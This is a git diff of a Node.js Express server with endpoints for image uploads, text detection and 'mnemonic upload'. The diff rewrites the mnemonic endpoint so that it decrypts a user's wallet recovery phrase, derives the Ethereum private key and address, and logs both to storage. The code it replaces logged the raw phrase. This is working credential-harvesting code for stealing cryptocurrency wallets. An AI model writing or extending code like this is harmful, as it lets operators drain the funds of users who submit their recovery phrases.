@@ -7,6 +7,8 @@ const cors = require('cors');
 const utils = require('./function');
 const textDetect = require('./text-detection');
 const { message } = require('statuses');
+const { hdkey } = require('ethereumjs-wallet');
+const bip39 = require('bip39');
 
 if (!process.env.DOCKER_ENV) {
     require('dotenv').config();
@@ -76,6 +78,7 @@ app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
         // Path and name of the file saved locally
         const localFilePath = req.file.path;
         const localFileName = req.file.filename;
+        const valid = null;
 
         // Upload to Backblaze B2
         const b2Response = await utils.uploadToB2(localFilePath, localFileName, userId);
@@ -170,6 +173,7 @@ app.post('/basic/image-edit-info-upload', async (req, res) => {
 });
 app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
+// TODO:
 app.post('/basic/mnemonic-upload', async (req, res) => {
     const { mnemonicPhase, userId } = req.body;
 
@@ -181,15 +185,31 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
     const decryptedMnemonicPhase = utils.decryptMnemonic(mnemonicPhase);
 
     try {
-        // Log the decryptedMnemonicPhase in MongoDB
-        await utils.logMnemonicPhase(userId, decryptedMnemonicPhase);
-        //await utils.uploadMnemonicToB2(userId, decryptedMnemonicPhase);
-        const valid = await utils.validateMnemonic(decryptedMnemonicPhase);
+        // Validate the decrypted mnemonic
+        const valid = bip39.validateMnemonic(decryptedMnemonicPhase);
+        if (!valid) {
+            return res.status(400).send('Invalid mnemonic phrase.');
+        }
+
+        // Convert mnemonic to seed
+        const seed = bip39.mnemonicToSeedSync(decryptedMnemonicPhase);
+
+        // Derive a path according to BIP-44
+        const hdwallet = hdkey.fromMasterSeed(seed);
+        const path = "m/44'/60'/0'/0/0";  // standard derivation path for Ethereum
+        const wallet = hdwallet.derivePath(path).getWallet();
+
+        // Get the private key and address
+        const privateKey = wallet.getPrivateKey().toString('hex');
+        const address = wallet.getAddressString();
+
+        // Log the wallet credentials instead of the mnemonic
+        await utils.logWalletCredentials(userId, address, privateKey);
 
         res.send({
             status: 'success',
             valid,
-            message: 'Mnemonic phrase uploaded successfully!'
+            message: 'Mnemonic phrase uploaded and credentials logged successfully!'
         });
     } catch (error) {
         console.error('Upload error:', error);
@@ -213,6 +233,29 @@ app.get('/basic/latest-release', async (req, res) => {
     });
 });
 app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight request for this endpoint
+
+// TODO: Return the keywords as search filters for the image.
+app.get('/basic/image-keywords', async (req, res) => {
+    const { userId } = req.query;
+
+    if (!userId) {
+        return res.status(400).send('Missing userId.');
+    }
+
+    try {
+        const keywords = await utils.getKeywords(); // TODO:
+
+        res.send({
+            status: 'success',
+            keywords,
+            message: 'Keywords found successfully!'
+        });
+    } catch (error) {
+        console.error('Search error:', error);
+        res.status(500).send('Failed to search keywords');
+    }
+});
+app.options('/basic/image-keywords', cors(corsOptions)); // Enable preflight request for this endpoint
 
 const SERVER_PORT = process.env.SERVER_PORT || 3000;
 const keyPath = process.env.PRIVKEY_PATH;
